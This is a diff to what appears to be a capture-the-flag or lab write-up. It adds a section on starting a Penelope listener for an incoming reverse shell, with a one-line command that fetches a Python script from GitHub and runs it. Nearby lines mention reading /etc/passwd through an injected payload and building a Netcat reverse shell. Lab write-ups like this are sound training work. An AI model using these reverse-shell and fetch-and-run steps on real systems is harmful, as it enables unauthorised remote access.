@@ -114,6 +114,17 @@ The server processed our injected payload and returned the full contents of `/et
 
 <img alt="Zrzut ekranu 2026-09-6 o 16 19 25" src="https://github.com/user-attachments/assets/7d27b3fc-c0be-488a-a744-1e7b077b1956" />
 
+### 🎧 Setting Up Penelope Listener
+
+Before triggering the reverse shell payload, I set up a listener on the attack box to capture the incoming connection. 
+
+Instead of standard `netcat`, I used **Penelope** — an advanced shell handler that automatically stabilizes the interactive TTY session upon connection:
+
+```bash
+wget -q [https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py](https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py) && python3 penelope.py
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 27 41" src="https://github.com/user-attachments/assets/d3fcc79d-6273-4b60-b4a9-010167fea6c1" />
+
 ### 🛠️ Generating the Reverse Shell Payload
 
 Next, I used RevShells to quickly build a reliable Netcat payload designed to spawn a standard `/bin/sh` session:
